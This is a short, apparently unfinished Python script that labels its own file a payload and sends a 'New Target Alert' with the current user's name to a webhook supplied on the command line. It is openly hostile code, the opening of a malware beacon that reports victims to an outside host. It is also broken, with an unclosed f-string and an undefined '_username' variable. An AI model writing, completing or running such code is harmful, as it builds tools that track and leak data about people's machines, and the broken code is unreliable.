import time
import os
import pathlib
import socket
import threading
import argparse, requests
import platform
import getpass

_working_path = pathlib.Path.cwd()
_payload_path = pathlib.Path(__file__).resolve()

_webhook_content = ["[!] New Target Alert", f"[i] User: {_username"]
ap = argparse.ArgumentParser()
ap.add_argument('--webhook', required=True)
args = ap.parse_args()
requests.post(args.webhook, json={'content': _webhook_content})
